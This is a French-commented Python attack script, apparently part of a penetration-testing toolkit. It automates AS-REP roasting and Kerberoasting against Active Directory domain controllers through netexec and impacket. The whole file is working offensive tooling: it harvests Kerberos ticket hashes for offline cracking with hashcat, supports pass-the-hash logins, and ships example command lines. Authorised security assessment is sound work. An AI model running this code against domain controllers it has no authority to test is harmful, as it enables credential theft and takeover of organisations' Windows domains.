#!/usr/bin/env python3
"""check_kerberos.py — AS-REP Roasting & Kerberoasting.

Recentré sur les deux attaques Kerberos (plus d'énumération/bruteforce de comptes :
l'énum authentifiée des users est couverte par check_ldap). check_kerberos garde sa
valeur propre : l'AS-REP roasting **sans creds** (comptes DONT_REQ_PREAUTH, via une
liste de comptes `--users`) et les fallbacks **impacket** (GetNPUsers / GetUserSPNs)
quand nxc n'est pas là.

  STEP 1  Détection du domaine (si -d absent).
  STEP 2  AS-REP Roasting — avec creds : nxc ldap --asreproast ; sans creds :
          GetNPUsers -no-pass sur la liste `--users` (comptes assainis).
  STEP 3  Kerberoasting (exige des creds) — nxc ldap --kerberoasting, fallback
          GetUserSPNs.

Overlap assumé avec check_ldap (roasting authentifié, demandé). Deux correctifs
intégrés : assainissement des comptes (`DOMAIN\\user` / `user@realm` → sAMAccountName
nu, sinon GetNPUsers échoue) et détection du **clock-skew** Kerberos (KRB_AP_ERR_SKEW)
avec remédiation (synchroniser l'horloge sur le DC).
"""

import argparse
import os
import re
import shlex
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path

from npns_common import (C, RULE, log_info, log_ok, log_warn, log_err, log_step,
                         tool_exists, confirm_step, set_total_steps, enable_auto_accept,
                         emit_progress)


set_total_steps(3)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run(cmd: str, timeout: int = 300):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", 1


def write_list(path: Path, items):
    """Écrit une liste triée dédupliquée."""
    unique = sorted(set(i.strip() for i in items if i.strip()))
    path.write_text("\n".join(unique) + ("\n" if unique else ""))
    return unique


def resolve_targets(target: str) -> list[str]:
    p = Path(target)
    if p.is_file():
        return [l.strip() for l in p.read_text().splitlines()
                if l.strip() and not l.startswith("#")]
    return [target]


def build_cred_args(username, password, hash_, domain) -> str:
    args = f"-u {shlex.quote(username)}"
    if hash_:
        args += f" -H {shlex.quote(hash_)}"
    elif password is not None:
        args += f" -p {shlex.quote(password)}"
    if domain:
        args += f" -d {shlex.quote(domain)}"
    return args


def sanitize_username(u: str) -> str:
    """`CORP\\jdoe` / `jdoe@corp.local` → `jdoe` (sAMAccountName nu).

    GetNPUsers attend des sAMAccountName nus dans -usersfile : un suffixe realm
    ou un préfixe domaine faisait échouer silencieusement toute la liste."""
    u = u.strip()
    if not u or u.startswith("#"):
        return ""
    if "\\" in u:
        u = u.split("\\", 1)[1]
    if "@" in u:
        u = u.split("@", 1)[0]
    return u.strip()


def sanitized_userfile(users_file: str, out: Path) -> Path | None:
    """Réécrit `--users` en comptes assainis dans le dossier de sortie."""
    src = Path(users_file)
    if not src.is_file():
        log_warn(f"--users : fichier introuvable ({users_file})")
        return None
    names = [sanitize_username(l) for l in src.read_text().splitlines()]
    names = [n for n in names if n]
    if not names:
        log_warn("--users : aucun compte exploitable après nettoyage")
        return None
    dst = out / "_krb_userlist_clean.txt"
    dst.write_text("\n".join(sorted(set(names))) + "\n")
    log_info(f"{len(set(names))} compte(s) assaini(s) → {dst.name}")
    return dst


_SKEW_RE = re.compile(r"(KRB_AP_ERR_SKEW|clock skew too great)", re.I)


def warn_clock_skew(text: str, dc_ip: str) -> bool:
    """Détecte un décalage d'horloge Kerberos et conseille la synchro sur le DC."""
    if _SKEW_RE.search(text or ""):
        log_warn("Clock skew Kerberos détecté (KRB_AP_ERR_SKEW) — l'horloge locale "
                 "diffère trop du DC.")
        log_warn(f"    Corrige p.ex. :  sudo ntpdate {dc_ip}   "
                 f"(ou  sudo rdate -n {dc_ip} , ou via faketime)")
        return True
    return False


def find_impacket(*names) -> str | None:
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


# ---------------------------------------------------------------------------
# STEP 1 — Détection du domaine
# ---------------------------------------------------------------------------

def step1_domain(hosts: list[str], out: Path, domain: str | None) -> str | None:
    log_step("STEP 1 — Domain detection")
    if domain:
        log_info(f"Domaine fourni : {domain}")
        return domain
    if not hosts:
        log_warn("Aucune cible — détection impossible")
        return None

    dc_ip = hosts[0]
    if tool_exists("nxc") and confirm_step("STEP 1 — Domain detection", f"nxc smb {dc_ip}"):
        stdout, _, _ = run(f"nxc smb {shlex.quote(dc_ip)} 2>/dev/null", timeout=30)
        m = re.search(r'domain:([^\s\)]+)', stdout, re.IGNORECASE)
        if m:
            detected = m.group(1).strip()
            log_ok(f"Domaine détecté : {detected}")
            (out / "krb_domain_info.txt").write_text(detected + "\n")
            return detected
    log_warn("Domaine non détecté — utilise -d pour le préciser.")
    return None


# ---------------------------------------------------------------------------
# STEP 2 — AS-REP Roasting
# ---------------------------------------------------------------------------

def step_asrep(hosts, out, domain, username, password, hash_, users_file):
    log_step("STEP 2 — AS-REP Roasting")
    if not domain:
        log_warn("Domaine requis (-d) — AS-REP ignoré.")
        return
    if not hosts:
        log_warn("Aucune cible — AS-REP ignoré.")
        return

    dc_ip = hosts[0]
    hash_file = out / "kerberos_asrep_hashes.txt"
    has_creds = bool(username and (password is not None or hash_))

    detail = ("nxc ldap <dc> --asreproast" if has_creds
              else "GetNPUsers.py -no-pass -usersfile <--users>")
    if not confirm_step("STEP 2 — AS-REP Roasting", detail):
        return

    # --- Avec creds : nxc ldap --asreproast (énumère seul les DONT_REQ_PREAUTH) ---
    if has_creds and tool_exists("nxc"):
        creds = build_cred_args(username, password, hash_, domain)
        log_info("AS-REP roasting via nxc ldap (authentifié)")
        stdout, stderr, _ = run(
            f"nxc ldap {shlex.quote(dc_ip)} {creds} --asreproast {shlex.quote(str(hash_file))} 2>&1",
            timeout=120)
        (out / "nxc_asreproast_raw.txt").write_text(stdout)
        warn_clock_skew(stdout + stderr, dc_ip)
        if hash_file.exists() and hash_file.stat().st_size > 0:
            n = len([l for l in hash_file.read_text().splitlines() if l.strip()])
            log_warn(f"[CRITICAL] {n} hash(es) AS-REP → {hash_file.name}  [hashcat -m 18200]")
        else:
            log_info("Aucun compte AS-REP roastable (préauth activée partout).")
        return

    # --- Sans creds : GetNPUsers -no-pass sur une liste de comptes ---
    getnp = find_impacket("GetNPUsers.py", "impacket-GetNPUsers")
    if not getnp:
        log_warn("GetNPUsers.py introuvable (pip install impacket) — AS-REP sans creds ignoré.")
        return
    if not users_file:
        log_warn("AS-REP sans creds : fournis une liste de comptes via --users <fichier> "
                 "(plus d'énumération intégrée — voir check_ldap pour l'énum authentifiée).")
        return
    uf = sanitized_userfile(users_file, out)
    if not uf:
        return

    log_info(f"GetNPUsers -no-pass contre {dc_ip} ({uf.name})")
    stdout, stderr, _ = run(
        f"python3 {shlex.quote(getnp)} {shlex.quote(domain)}/ -dc-ip {shlex.quote(dc_ip)} "
        f"-no-pass -usersfile {shlex.quote(str(uf))} -format hashcat 2>&1",
        timeout=240)
    (out / "getnpusers_asrep_raw.txt").write_text(stdout + stderr)
    if warn_clock_skew(stdout + stderr, dc_ip):
        log_warn("AS-REP probablement faussé par le skew — relance après synchro.")
    hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
    if hashes:
        write_list(hash_file, hashes)
        log_warn(f"[CRITICAL] {len(hashes)} hash(es) AS-REP → {hash_file.name}  [hashcat -m 18200]")
    else:
        log_info("Aucun hash AS-REP (aucun compte DONT_REQ_PREAUTH dans la liste).")


# ---------------------------------------------------------------------------
# STEP 3 — Kerberoasting
# ---------------------------------------------------------------------------

def step_kerberoast(hosts, out, domain, username, password, hash_):
    log_step("STEP 3 — Kerberoasting")
    if not (username and (password is not None or hash_)):
        log_warn("Kerberoasting exige des creds (-u + -p/-H) — ignoré.")
        return
    if not domain:
        log_warn("Domaine requis (-d) — Kerberoasting ignoré.")
        return
    if not hosts:
        log_warn("Aucune cible — Kerberoasting ignoré.")
        return

    dc_ip = hosts[0]
    spn_file = out / "kerberos_spn_hashes.txt"

    if not confirm_step("STEP 3 — Kerberoasting",
                        "nxc ldap <dc> --kerberoasting  (fallback GetUserSPNs.py -request)"):
        return

    # --- nxc ldap --kerberoasting ---
    if tool_exists("nxc"):
        creds = build_cred_args(username, password, hash_, domain)
        log_info("Kerberoasting via nxc ldap")
        stdout, stderr, _ = run(
            f"nxc ldap {shlex.quote(dc_ip)} {creds} --kerberoasting {shlex.quote(str(spn_file))} 2>&1",
            timeout=120)
        (out / "nxc_kerberoast_raw.txt").write_text(stdout)
        warn_clock_skew(stdout + stderr, dc_ip)
        if spn_file.exists() and spn_file.stat().st_size > 0:
            n = len([l for l in spn_file.read_text().splitlines() if l.strip()])
            log_warn(f"[CRITICAL] {n} hash(es) SPN → {spn_file.name}  [hashcat -m 13100]")
            return
        log_info("Aucun compte kerberoastable via nxc (ou skew) — tentative GetUserSPNs…")

    # --- Fallback GetUserSPNs.py ---
    getspns = find_impacket("GetUserSPNs.py", "impacket-GetUserSPNs")
    if not getspns:
        log_warn("nxc sans résultat et GetUserSPNs.py introuvable — Kerberoasting incomplet.")
        return

    # Tout quoter : un mot de passe avec ';', '$', espace… casserait la commande (shell=True).
    cred_str = shlex.quote(f"{domain}/{username}")
    if hash_:
        cred_str += f" -hashes {shlex.quote(hash_)}"
    elif password is not None:
        cred_str += f":{shlex.quote(password)}"

    log_info(f"Kerberoasting via {Path(getspns).name}")
    stdout, stderr, _ = run(
        f"python3 {shlex.quote(getspns)} {cred_str} -dc-ip {shlex.quote(dc_ip)} "
        f"-request -format hashcat 2>&1",
        timeout=240)
    (out / "getuserspns_raw.txt").write_text(stdout + stderr)
    if warn_clock_skew(stdout + stderr, dc_ip):
        log_warn("Kerberoast probablement faussé par le skew — relance après synchro.")
    hashes = re.findall(r'\$krb5tgs\$[^\s]+', stdout)
    if hashes:
        write_list(spn_file, hashes)
        log_warn(f"[CRITICAL] {len(hashes)} hash(es) SPN → {spn_file.name}  [hashcat -m 13100]")
    else:
        log_info("Aucun compte kerberoastable.")


# ---------------------------------------------------------------------------
# Résumé
# ---------------------------------------------------------------------------

def write_summary(out: Path, hosts: list[str], domain: str | None):
    lines = [
        "Kerberos Check Summary",
        "=" * 40,
        f"Date   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Targets: {len(hosts)} host(s)",
        f"Domain : {domain or 'unknown'}",
        "",
    ]
    for fname, label in [("kerberos_asrep_hashes.txt", "AS-REP hashes (m18200)"),
                         ("kerberos_spn_hashes.txt",   "SPN hashes (m13100)")]:
        p = out / fname
        n = len([l for l in p.read_text().splitlines() if l.strip()]) if p.exists() else 0
        tag = " [CRITICAL]" if n > 0 else ""
        lines.append(f"  {label}: {n}{tag}")

    summary = "\n".join(lines) + "\n"
    (out / "kerberos_summary.txt").write_text(summary)
    print(f"\n{C.BOLD}{summary}{C.ENDC}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="check_kerberos.py — AS-REP Roasting & Kerberoasting",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Outils (selon l'usage) :
  nxc (netexec)  : apt install netexec
  impacket       : pip install impacket   (GetNPUsers.py / GetUserSPNs.py)

Examples:
  # AS-REP sans creds (liste de comptes fournie)
  python3 check_kerberos.py -t dc01 -d corp.local --users users.txt

  # AS-REP + Kerberoast authentifiés
  python3 check_kerberos.py -t 10.0.0.10 -d corp.local -u jdoe -p 'P@ss123'

  # Pass-the-hash
  python3 check_kerberos.py -t dc01 -d corp.local -u admin -H aad3b435b51404eeaad3b435b51404ee:xxxx
""")
    parser.add_argument("-t", "--target", required=True, help="Host file, IP, ou hostname")
    parser.add_argument("-o", "--output", default=None,
                        help="Répertoire de sortie (défaut: ./kerberos_results_<ts>)")
    parser.add_argument("-u", "--username", default=None, help="Utilisateur")
    parser.add_argument("-p", "--password", default=None, help="Mot de passe")
    parser.add_argument("-H", "--hash", default=None, help="Hash NTLM LM:NT")
    parser.add_argument("-d", "--domain", default=None, help="Domaine FQDN (ex. corp.local)")
    parser.add_argument("--users", default=None,
                        help="Liste de comptes pour l'AS-REP roasting SANS creds "
                             "(sAMAccountName ; DOMAIN\\user ou user@realm sont assainis)")
    parser.add_argument("-y", "--yes", action="store_true",
                        help="Non-interactif : accepte toutes les étapes (automatisation/UI)")
    args = parser.parse_args()
    if getattr(args, "yes", False):
        enable_auto_accept()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = Path(args.output) if args.output else Path(f"kerberos_results_{ts}")
    out.mkdir(parents=True, exist_ok=True)
    log_info(f"Output directory: {out}")

    for tool, pkg in [("nxc", "netexec"), ("GetNPUsers.py", "impacket")]:
        if not tool_exists(tool) and not shutil.which(tool):
            log_warn(f"'{tool}' absent — certains chemins seront ignorés ({pkg})")

    hosts = resolve_targets(args.target)
    if not hosts:
        log_warn("Aucune cible — sortie.")
        sys.exit(0)
    log_info(f"Targets: {len(hosts)} host(s)")

    domain = step1_domain(hosts, out, args.domain)
    step_asrep(hosts, out, domain, args.username, args.password, args.hash, args.users)
    step_kerberoast(hosts, out, domain, args.username, args.password, args.hash)
    write_summary(out, hosts, domain)


if __name__ == "__main__":
    main()
